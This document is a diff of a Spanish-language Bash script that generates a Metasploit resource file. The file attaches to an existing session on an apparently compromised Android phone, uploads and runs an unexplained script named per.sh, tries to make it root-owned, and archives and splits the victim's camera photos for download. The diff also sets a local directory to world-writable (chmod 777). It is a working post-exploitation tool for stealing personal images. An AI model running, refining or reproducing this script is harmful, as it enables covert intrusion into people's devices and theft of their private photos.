@@ -21,7 +21,7 @@ done
 
 # Verificar si se proporcionó un nombre de usuario
 if [[ -z "$USERNAME" ]]; then
-    echo -e "\e[31mDebe proporcionar un nombre de usuario con la opción -u.\e[0m"
+    print_cyan "Debe proporcionar un nombre de usuario con la opción -u|--user."
     usage
 fi
 
@@ -43,31 +43,37 @@ echo -e "\e[32mCreando el directorio de destino $DEST_DIR...\e[0m"
 # Crear el directorio de destino si no existe
 mkdir -p "$DEST_DIR"
 
+# Verificar si se pudo crear el directorio
+if [ $? -ne 0 ]; then
+    echo -e "\e[31mError: No se pudo crear el directorio de destino.\e[0m"
+    exit 1
+fi
+
+# Cambiar los permisos del directorio de destino
+chown root:root "$DEST_DIR" 2>/dev/null
+chmod 777 "$DEST_DIR" 2>/dev/null
+
 # Generar el archivo de recursos de Metasploit
 cat <<EOL > get.rc
 echo "Obteniendo información del dispositivo..."
 sessions -interact $SESSION_ID --timeout 7200
-shell
+shell <<EOF
 echo "Cambiando al directorio /sdcard/DCIM"
 cd /sdcard/DCIM
-shell
 echo "Subiendo el script per.sh"
 upload ./utilities/per.sh
-shell
 echo "Dando permisos de ejecución al script per.sh"
 chmod +x per.sh
-shell
 echo "Cambiando el propietario del script per.sh a root (si es posible)"
 chown root:root per.sh || true
-shell
 echo "Ejecutando el script per.sh"
 ./per.sh
-shell
 echo "Comprimiendo el directorio Camera"
 tar -czvf Camera.tar.gz Camera
-shell
 echo "Dividiendo el archivo Camera.tar.gz en partes de 50MB"
 split -b 50M Camera.tar.gz Camera.tar.gz.part
+exit
+EOF
 echo "Descargando las partes del archivo Camera.tar.gz"
 EOL
 
